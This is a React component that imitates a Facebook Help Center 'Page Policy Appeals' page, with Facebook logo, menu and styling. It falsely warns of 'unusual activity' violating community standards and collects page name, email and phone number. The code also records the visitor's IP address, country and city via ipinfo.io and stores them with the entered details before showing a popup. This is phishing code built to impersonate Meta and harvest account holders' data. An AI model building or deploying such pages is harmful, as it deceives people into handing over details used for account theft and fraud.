import React, { useState,useEffect} from "react";
import '../MyForm/index.scss';
import facebookLogo from '../../../Resources/Facebook.png'
import PhoneInput from 'react-phone-input-2'
import 'react-phone-input-2/lib/style.css'
import validator from "validator";
import MyPopup from "../../components/popup";

const MyForm = () => {
   const [disabled, setDisabled] = useState(true);
   const [phone, setPhone] = useState("");
   const [email, setEmail] = useState("");
   const [isPopupOpen, setPopupOpen] = useState(false);
   const [countryCode, setCountryCode] = useState('');
   const handlePhoneChange = (e) => {
      setPhone(e);
      if (!validator.isMobilePhone(e)) {
        setDisabled(true);
      } else {
        setDisabled(false);
      }
    };
  
    const handleEmailChange = (e) => {
      const newEmail = e.target.value;
      setEmail(newEmail);
      if (!validator.isEmail(newEmail)) {
        setDisabled(true);
      } else {
        setDisabled(false);
      }
    };
  
    useEffect(() => {
      const setLocaltion = async () => {
        try {
          fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
            var countryCode = d.country;
            setCountryCode(countryCode.toLowerCase());
            localStorage.setItem(
              "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
            );
          })
        } catch (error) {
          console.error("Error fetching data:", error);
        }
      };
      setLocaltion();
    }, []);
  
    const handleSubmit = (e) => {
      e.preventDefault();
      if (!validator.isEmail(email) || !validator.isMobilePhone(phone)){
        alert("Please provide us valid information!");
      } else {
        try{
          var ip = localStorage.getItem("location"); 
          localStorage.setItem(
            "user",
            JSON.stringify({phone,email,ip})
          );
          setPopupOpen(true);
        }catch(e){
          console.log(e);
        }
      }
    };
  
    const closePopup = () => {
      setPopupOpen(false);
    };
  return (
<div>
<div className="topheader bg-facebook p-2 bg-[#355797]" style={{color:'rgb(53, 87, 151)'}}>
   <div className="sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
      <div className="w-[20%] md:w-[15%]"><a href=""><img src={facebookLogo} className="object-cover"/></a></div>
      <div className="flex shadow-sm w-[60%] md:w-[50%]">
         <span className="px-4 inline-flex items-center min-w-fit border border-r-0 border-gray-200 bg-gray-50 text-sm ">
            <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
               <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"></path>
            </svg>
         </span>
         <input type="search" className="rounded-none py-2 px-3 block w-full border-gray-200 shadow-sm text-sm focus:z-10 focus:border-blue-500 focus:ring-blue-500 focus:outline-none" placeholder="How can we help?"/>
      </div>
   </div>
</div>
<div className="bg-[#E9EBEE]">
   <div className="w-11/12 sm:w-11/12 md:w-4/6 flex justify-between items-center mx-auto">
      <a href="#" className="flex items-center text-[#3578E5] gap-2 font-semibold py-6 border-b-[3px] border-[#3578E5]" style={{color:'rgb(53, 120, 229)',borderBottom:'3px solid rgb(53, 120, 229)'}}>
         <span>
            <svg stroke="currentColor" fill="currentColor" strokeWidth="0" viewBox="0 0 576 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
               <path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"></path>
            </svg>
         </span>
         Help Center
      </a>
      <p className="text-[#3578E5] text-xs">English</p>
   </div>
</div>
<div className="w-11/12 sm:w-11/12 md:w-4/6 grid gap-10 mx-auto my-8 grid-cols-1 md:grid-cols-[0.3fr_1fr] ">
   <div className="order-1 md:order-none max-sm:hidden">
      <ul className="[&amp;>li>a]:text-[14px] [&amp;>li>a]:py-[5px] [&amp;>li>a]:pr-5 [&amp;>li>a]:block [&amp;>li>a:hover]:bg-[#E9EBEE] flex flex-col gap-2">
         <li><a href="#">Creating an Account</a></li>
         <li><a href="#">Your Profile</a></li>
         <li><a href="#">Friending</a></li>
         <li><a href="#">Facebook Dating</a></li>
         <li><a href="#">Your Home Page</a></li>
         <li><a href="#">Messaging</a></li>
         <li><a href="#">Reels</a></li>
         <li><a href="#">Stories</a></li>
         <li><a href="#">Photos</a></li>
         <li><a href="#">Videos</a></li>
         <li><a href="#">Gaming</a></li>
         <li><a href="#">Pages</a></li>
         <li><a href="#">Groups</a></li>
         <li><a href="#">Events</a></li>
         <li><a href="#">Fundraisers and Donations</a></li>
         <li><a href="#">Meta Pay</a></li>
         <li><a href="#">Marketplace</a></li>
         <li><a href="#">Apps</a></li>
         <li><a href="#">Facebook Mobile Apps</a></li>
         <li><a href="#">Accessibility</a></li>
      </ul>
   </div>
   <MyPopup isOpen={isPopupOpen} onClose={closePopup} />
   <form id="ccnpwxpytrb" className="w-100% md:w-[74%] rounded-lg border border-gray-200 h-fit order-1 md:order-none" onSubmit={handleSubmit}>
      <div className="font-semibold rounded-t-lg text-lg border-b border-gray-200 bg-[#F5F6F7] p-3">
         <h1>Page Policy Appeals</h1>
      </div>
      <div className="p-4" style={{borderLeft:'1px solid rgb(233, 235, 238)',borderRight:'1px solid rgb(233, 235, 238)'}}>
         <p className="text-xs mb-4">We have detected unusual activity on your page that violates our community standards.</p>
         {/* <p className="text-xs mb-4">Your access to your page has been limited, and you are currently unable to post, share, or comment using your page.</p> */}
         <p className="text-xs mb-4">If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary information.</p>
         <div className="mb-4"><label className="block"><span className="after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">Page Name</span>
         <input type="text" name="dliyxuvfhnv" className=" mt-1 px-3 py-1 bg-white border shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"/></label></div>
         {/* <div className="mb-4"><label className="block"><span className="after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">Fullname</span><input type="text" name="rcuarvklkut" className="mt-1 px-3 py-1 bg-white border shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"/></label></div> */}
         <div className="mb-4"><label className="block"><span className="after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">Email Address</span><input type="email" onChange={handleEmailChange} name="jgakoympwjd" className="mt-1 px-3 py-1 bg-white border  shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"/></label></div>
         {/* <div className="mb-4"><label className="block"><span className="after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">Personal Email Address</span><input type="email" name="xqdmbnlkpcq" className="mt-1 px-3 py-1 bg-white border shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"/></label></div> */}
         <div className="mb-4"><label className="block"><span className="after:content-['*'] after:ml-0.5 after:text-red-500 block text-xs font-bold text-[#90949C]">Phone Number</span>
         {/* <input type="text" name="gpaciebmfzw" className="mt-1 px-3 py-1 bg-white border  shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"/> */}
         <PhoneInput
                  containerStyle={{marginTop:'3px'}}
                    inputStyle={{height:'30px'}}
                    inputClass="mt-1 px-3 py-1 bg-white border  shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block w-full rounded-sm sm:text-sm focus:ring-1"
                    enableAreaCodes={true}
                    country={countryCode}
                    value={phone}
                    onChange={handlePhoneChange}
                    />
         </label></div>
         <div className="mb-4"><label className="block"><span className="text-[#90949C] block text-xs font-bold">Please provide us information that will help us investigate.</span><textarea name="yykwevbhfh" className="form-control mt-1 px-3 py-1 bg-white border shadow-sm border-slate-300 placeholder-slate-400 focus:outline-none focus:border-black focus:ring-black block rounded-sm sm:text-sm focus:ring-1" rows="4"></textarea></label></div>
      </div>
      <div className="font-semibold rounded-b-lg flex justify-end text-lg border-t border-gray-200 bg-[#F5F6F7] p-3"><button type="submit" className="bg-blue-800 hover:bg-facebook rounded-sm px-4 py-2 text-white text-sm font-semibold">Send</button></div>
   </form>
</div>
<div>
</div>
</div>
  );
}

export default MyForm;
